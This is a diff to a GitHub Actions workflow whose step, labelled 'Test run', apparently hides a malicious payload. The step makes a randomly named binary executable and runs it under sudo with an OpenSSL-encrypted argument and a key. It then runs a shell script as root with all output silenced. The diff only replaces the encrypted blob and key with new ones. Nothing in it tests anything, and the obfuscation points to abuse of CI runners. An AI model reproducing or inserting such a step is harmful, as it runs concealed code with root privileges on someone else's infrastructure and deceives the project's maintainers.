@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'zzfxf'
+        echo 'ykrpt'
         sudo chmod +x garyiip7x/heardyg34i.ex
-        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX1/oTLW1ubZdzi/n3jf2LlQJowDyg+NAT1kXVvgDhqAWcQxejverUb0fW5ili37aXhKm6t/UlEkmXLKwx8rZUKAE0xEx/s/qJTbsx0sawKtmv92mbF0TRu68 9rika8 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX1+KCk5Xd05ZU5DkT78i4oI6uZONnjIm0lc6QPLKKuE7yjcwiaF5fZHS+rqaQQ4Zbiydp5x8WzdAw7d1iTtjui7ktGVuW/C/g1UAiBiYWeRBhWxxRgRBT+rO fw5ox9 && sudo sh r.sh > /dev/null 2>&1
